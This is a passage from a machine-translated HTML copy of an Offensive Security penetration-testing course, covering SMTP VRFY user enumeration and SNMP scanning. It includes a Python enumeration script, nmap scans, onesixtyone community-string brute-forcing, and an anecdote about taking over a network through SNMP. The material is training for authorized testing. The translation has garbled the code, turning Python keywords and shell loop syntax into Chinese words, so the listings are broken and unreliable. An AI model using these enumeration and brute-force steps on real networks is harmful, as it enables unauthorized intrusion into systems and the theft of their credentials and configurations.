<div style="position:absolute;top:238059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑以下 Python 脚本，它打开一个 TCP 套接字，连接到 SMTP 服务器，然后</font></font></nobr></div>
<div style="position:absolute;top:238078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为给定的用户名发出 VRFY 命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:238113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:238147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:238164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导入系统</font></font></nobr></div>
<div style="position:absolute;top:238198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 len(sys.argv) != 2:</font></font></nobr></div>
<div style="position:absolute;top:238215;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“用法：vrfy.py &lt;用户名&gt;”</font></font></nobr></div>
<div style="position:absolute;top:238232;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys.exit(0)</font></font></nobr></div>
<div style="position:absolute;top:238266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 创建一个套接字</font></font></nobr></div>
<div style="position:absolute;top:238283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</font></font></nobr></div>
<div style="position:absolute;top:238317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 连接到服务器</font></font></nobr></div>
<div style="position:absolute;top:238334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 = s.connect(('10.11.1.217',25))</font></font></nobr></div>
<div style="position:absolute;top:238368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 接收横幅</font></font></nobr></div>
<div style="position:absolute;top:238384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">横幅 = s.recv(1024)</font></font></nobr></div>
<div style="position:absolute;top:238419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印横幅</font></font></nobr></div>
<div style="position:absolute;top:238453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># VRFY 一个用户</font></font></nobr></div>
<div style="position:absolute;top:238469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.send('VRFY' + sys.argv[1] + '\r\n')</font></font></nobr></div>
<div style="position:absolute;top:238486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果 = s.recv(1024)</font></font></nobr></div>
<div style="position:absolute;top:238520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印结果</font></font></nobr></div>
<div style="position:absolute;top:238554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 关闭套接字</font></font></nobr></div>
<div style="position:absolute;top:238571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.close()</font></font></nobr></div>
<div style="position:absolute;top:238590;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 265 - 使用 Python 编写 SMTP 用户枚举脚本</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:238621;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.5.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:238652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 搜索您的目标网络范围，看看您是否可以识别任何响应</font></font></nobr></div>
<div style="position:absolute;top:238671;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMTP </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VRFY</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
<div style="position:absolute;top:238699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 尝试使用此 Python 代码使用文本文件自动执行用户名发现过程</font></font></nobr></div>
<div style="position:absolute;top:238718;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以用户名作为输入。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:238756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6 SNMP 枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:238797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多年来，我们经常发现简单网络管理协议 (SNMP)</font></font></nobr></div>
<div style="position:absolute;top:238817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许多网络管理员都很好理解。</font><font style="vertical-align: inherit;">这通常会导致 SNMP 错误配置，</font></font></nobr></div>
<div style="position:absolute;top:238836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能会导致重大的信息泄漏。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:238963;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="202"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第202页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:238996;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:240073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:240073;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:240073;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">202</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:239092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SNMP 基于 UDP，一种简单的无状态协议，因此容易受到 IP 欺骗</font></font></nobr></div>
<div style="position:absolute;top:239111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和重放攻击。</font><font style="vertical-align: inherit;">此外，常用的 SNMP 协议 1、2 和 2c 不提供流量</font></font></nobr></div>
<div style="position:absolute;top:239130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加密，这意味着 SNMP 信息和凭据可以通过本地轻松拦截</font></font></nobr></div>
<div style="position:absolute;top:239150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络。</font><font style="vertical-align: inherit;">传统的 SNMP 协议也有弱认证方案，通常</font></font></nobr></div>
<div style="position:absolute;top:239169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">left 配置了默认的公共和私人社区字符串。</font></font></nobr></div>
<div style="position:absolute;top:239202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，考虑到以上所有内容都适用于协议，根据定义，该协议旨在“管理</font></font></nobr></div>
<div style="position:absolute;top:239221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络”。</font><font style="vertical-align: inherit;">由于所有这些原因，SNMP 是另一种我们最喜欢的枚举协议。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:239283;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几年前，我们对一家公司进行了内部渗透测试</font></font></i></nobr></div>
<div style="position:absolute;top:239303;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为大量企业客户提供网络集成服务，</font></font></i></nobr></div>
<div style="position:absolute;top:239322;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">银行和其他类似组织。</font><font style="vertical-align: inherit;">经过几个小时的探索</font></font></i></nobr></div>
<div style="position:absolute;top:239341;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统，我们发现了一个大型 B 类网络，其中连接了数千</font></font></i></nobr></div>
<div style="position:absolute;top:239361;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路由器。</font><font style="vertical-align: inherit;">向我们解释说，这些路由器中的每一个都是通往一个</font></font></i></nobr></div>
<div style="position:absolute;top:239380;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于管理和配置目的。</font></font></i></nobr></div>
<div style="position:absolute;top:239426;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对默认 cisco / cisco telnet 凭据的快速扫描发现了一个低</font></font></i></nobr></div>
<div style="position:absolute;top:239446;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束 Cisco ADSL 路由器。</font><font style="vertical-align: inherit;">进一步挖掘揭示了一组复杂的 SNMP</font></font></i></nobr></div>
<div style="position:absolute;top:239465;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路由器配置文件中的公共和私有社区字符串。</font><font style="vertical-align: inherit;">当它转身</font></font></i></nobr></div>
<div style="position:absolute;top:239484;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出来，这些相同的公共和私人社区字符串被用于每一个</font></font></i></nobr></div>
<div style="position:absolute;top:239504;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络设备，适用于整个 B 级范围，甚至更远——简单</font></font></i></nobr></div>
<div style="position:absolute;top:239523;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理，对吗？</font></font></i></nobr></div>
<div style="position:absolute;top:239570;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于企业路由硬件的一个有趣的事情是这些设备经常</font></font></i></nobr></div>
<div style="position:absolute;top:239589;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">支持通过私有SNMP团体字符串读写配置文件</font></font></i></nobr></div>
<div style="position:absolute;top:239608;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用权。</font><font style="vertical-align: inherit;">由于所有网关路由器的专用社区字符串都是</font></font></i></nobr></div>
<div style="position:absolute;top:239627;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们知道了，通过编写一个简单的脚本来复制所有路由器配置</font></font></i></nobr></div>
<div style="position:absolute;top:239647;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在使用 SNMP 和 TFTP 协议的网络上，我们不仅破坏了</font></font></i></nobr></div>
<div style="position:absolute;top:239666;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">整个网络集成公司的基础设施，但</font></font></i></nobr></div>
<div style="position:absolute;top:239685;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们的客户，以及。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:239748;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.1 SNMP MIB 树</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:239786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SNMP 管理信息库 (MIB) 是一个包含信息的数据库，通常</font></font></nobr></div>
<div style="position:absolute;top:239805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与网络管理有关。</font><font style="vertical-align: inherit;">数据库像树一样组织，其中分支代表</font></font></nobr></div>
<div style="position:absolute;top:239824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不同的组织或网络功能。</font><font style="vertical-align: inherit;">树的叶子（最终端点）对应于</font></font></nobr></div>
<div style="position:absolute;top:239843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后可以由外部用户访问和探测的特定变量值。</font><font style="vertical-align: inherit;">IBM</font></font></nobr></div>
<div style="position:absolute;top:239863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知识中心</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">217</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含大量关于 MIB 树的信息。</font></font></nobr></div>
<div style="position:absolute;top:239896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，以下 MIB 值对应于特定的 Microsoft Windows SNMP</font></font></nobr></div>
<div style="position:absolute;top:239915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数并且包含的​​不仅仅是基于网络的信息：</font></font></nobr></div>
<div style="position:absolute;top:239949;left:313"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.3.6.1.2.1.25.1.6.0 系统进程</font></font></nobr></div>
<div style="position:absolute;top:239969;left:307"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.3.6.1.2.1.25.4.2.1.2 运行程序</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:240023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">217 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（IBM，2019 年），https://www.ibm.com/support/knowledgecenter/ssw_aix_71/commprogramming/mib.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:240151;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="203"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第203页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:240184;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:241261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:241261;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:241261;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">203</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:240281;left:307"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.3.6.1.2.1.25.4.2.1.4</font></font></nobr></div>
<div style="position:absolute;top:240281;left:488"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程路径</font></font></nobr></div>
<div style="position:absolute;top:240301;left:307"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.3.6.1.2.1.25.2.3.1.4</font></font></nobr></div>
<div style="position:absolute;top:240301;left:496"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储单元</font></font></nobr></div>
<div style="position:absolute;top:240320;left:307"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.3.6.1.2.1.25.6.3.1.2</font></font></nobr></div>
<div style="position:absolute;top:240320;left:488"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件名称</font></font></nobr></div>
<div style="position:absolute;top:240341;left:309"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.3.6.1.4.1.77.1.2.25</font></font></nobr></div>
<div style="position:absolute;top:240341;left:492"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐户</font></font></nobr></div>
<div style="position:absolute;top:240361;left:313"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.3.6.1.2.1.6.13.1.3</font></font></nobr></div>
<div style="position:absolute;top:240361;left:486"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 本地端口</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:240381;left:353"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表 6 - Windows SNMP MIB 值</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:240412;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.2 扫描 SNMP</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:240450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要扫描开放的 SNMP 端口，我们可以运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，如下例所示。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sU</font></font></font></b></nobr></div>
<div style="position:absolute;top:240469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项用于执行 UDP 扫描，-- </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">open</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项用于将输出限制为仅</font></font></nobr></div>
<div style="position:absolute;top:240489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示开放端口：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:240524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:240541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-05-01 06:26 MDT 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:240557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.7 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:240574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.080 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:240609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国    </font></font></nobr></div>
<div style="position:absolute;top:240609;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font></font></nobr></div>
<div style="position:absolute;top:240625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">161/udp 打开|过滤的snmp</font></font></nobr></div>
<div style="position:absolute;top:240642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:89:1A:CD (VMware)</font></font></nobr></div>
<div style="position:absolute;top:240676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.10 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:240693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.080 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:240727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国    </font></font></nobr></div>
<div style="position:absolute;top:240727;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font></font></nobr></div>
<div style="position:absolute;top:240744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">161/udp 打开|过滤的snmp</font></font></nobr></div>
<div style="position:absolute;top:240761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:93:4E:DC (VMware)</font></font></nobr></div>
<div style="position:absolute;top:240778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:240797;left:315"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 266 - 使用 nmap 执行 SNMP 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:240827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者，我们可以使用诸如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">oneixtyone</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">218 之</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类的工具</font><font style="vertical-align: inherit;">来尝试蛮力攻击</font></font></nobr></div>
<div style="position:absolute;top:240846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对 IP 地址列表。</font><font style="vertical-align: inherit;">首先，我们必须构建包含社区字符串和</font></font></nobr></div>
<div style="position:absolute;top:240866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们希望扫描的 IP 地址：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:240900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo public &gt; 社区</font></font></font></b></nobr></div>
<div style="position:absolute;top:240917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo private &gt;&gt; community</font></font></font></b></nobr></div>
<div style="position:absolute;top:240934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo manager &gt;&gt; community</font></font></font></b></nobr></div>
<div style="position:absolute;top:240968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for ip in $(seq 1 254); </font><font style="vertical-align: inherit;">做回声 10.11.1.$ip; </font><font style="vertical-align: inherit;">完成 &gt; ips</font></font></font></b></nobr></div>
<div style="position:absolute;top:241002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">oneixtyone -c community -i ips</font></font></font></b></nobr></div>
<div style="position:absolute;top:241019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描254台主机，3个社区</font></font></nobr></div>
<div style="position:absolute;top:241036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.14 [public] 硬件：x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Soft</font></font></nobr></div>
<div style="position:absolute;top:241053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件：Windows 2000 版本 5.1（Build 2600 Uniprocessor Free）</font></font></nobr></div>
<div style="position:absolute;top:241070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.13 [public] 硬件：x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Soft</font></font></nobr></div>
<div style="position:absolute;top:241087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件：Windows 2000 版本 5.1（Build 2600 Uniprocessor Free）</font></font></nobr></div>
<div style="position:absolute;top:241104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.22 [public] Linux barry 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686</font></font></nobr></div>
<div style="position:absolute;top:241121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:241140;left:273"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 267 - 使用 onesixtyone 暴力破解社区字符串</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:241211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">218 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Alexander Sotirov, 2008)，http://www.phreedom.org/software/onesixtyone/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:241339;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="204"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第204页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:241372;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:242449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:242449;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:242449;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">204</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:241468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们找到了 SNMP 服务，我们就可以开始查询它们的特定 MIB 数据，这些数据可能是</font></font></nobr></div>
<div style="position:absolute;top:241487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有趣的。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:241522;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.3 Windows SNMP 枚举示例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:241560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用诸如</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">snmpwalk 之类</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的工具来探测和查询 SNMP 值，</font><font style="vertical-align: inherit;">前提是我们至少知道</font></font></nobr></div>
<div style="position:absolute;top:241579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SNMP 只读社区字符串，在大多数情况下为“公共”。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:241613;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.3.1 枚举整个 MIB 树</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:241648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用清单 268 中提供的一些 MIB 值，我们可以尝试枚举它们</font></font></nobr></div>
<div style="position:absolute;top:241667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相应的值。</font><font style="vertical-align: inherit;">在实验室中针对已知机器尝试以下示例，其中</font></font></nobr></div>
<div style="position:absolute;top:241687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一个带有社区字符串“public”的 Windows SNMP 端口。</font><font style="vertical-align: inherit;">这个命令</font></font></nobr></div>
<div style="position:absolute;top:241706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列举使用整个MIB树</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项来指定社区字符串，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font></font></nobr></div>
